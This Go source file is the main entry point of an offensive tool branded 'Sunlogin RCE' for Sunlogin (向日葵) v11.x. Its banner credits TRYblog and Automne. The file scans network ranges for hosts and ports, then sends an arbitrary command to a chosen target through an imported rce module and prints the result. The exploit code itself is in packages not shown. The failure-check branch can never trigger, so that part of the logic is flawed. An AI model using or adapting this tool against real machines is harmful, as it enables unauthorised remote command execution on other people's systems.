package main

import (
	"flag"
	"fmt"
	"time"
	"strings"
	"sunlogin/find"
	"sunlogin/rce"
	"sunlogin/config"
)

func init() {
	logo := `

╔═╗┬ ┬┌┐┌╦  ┌─┐┌─┐┬┌┐┌   ╦═╗┌─┐┌─┐
╚═╗│ ││││║  │ ││ ┬││││───╠╦╝│  ├┤ 0.0
╚═╝└─┘┘└┘╩═╝└─┘└─┘┴┘└┘   ╩╚═└─┘└─┘

						    Modified by: Automne
						    By: TRYblog
						    向日葵v11.x RCE
适配fscan主机存活/端口扫描和IP解析代码，支持网段批量探测，解决中文乱码						
----------------------------------------------------------
`
	fmt.Println(logo)

}
func main() {

	var Info find.HostInfo
	find.Flag(&Info)

	if Info.Host != "" {
		switch Info.Type {
		case "scan":
			fmt.Println("[ $ ] 扫描进行中,请稍等..")
			start := time.Now()

			find.Scan(Info)

			end := time.Since(start)
			fmt.Println("[ $ ] 扫描耗时:", end)
			fmt.Println("----------------------------------------------")
		case "rce":
			if Info.Host != "" && Info.Ports != "" && Info.Cmd != "" {
				config.SetIp(Info.Host)
				config.SetPort(Info.Ports)
				str := rce.RunCmd(Info.Cmd)
				if str != "" {
					fmt.Println("[ $ ] 命令执行成功:\n", str)
				} else if strings.Contains(str, "Verification") {
					fmt.Println("[ $ ] 命令执行失败,可能不存在rce.")
				} else {
					fmt.Println("[ $ ] 命令执行完毕,但是没有回显.")
				}
			}
		default:
			flag.Usage()

		}
	} else {
		flag.Usage()
	}

}
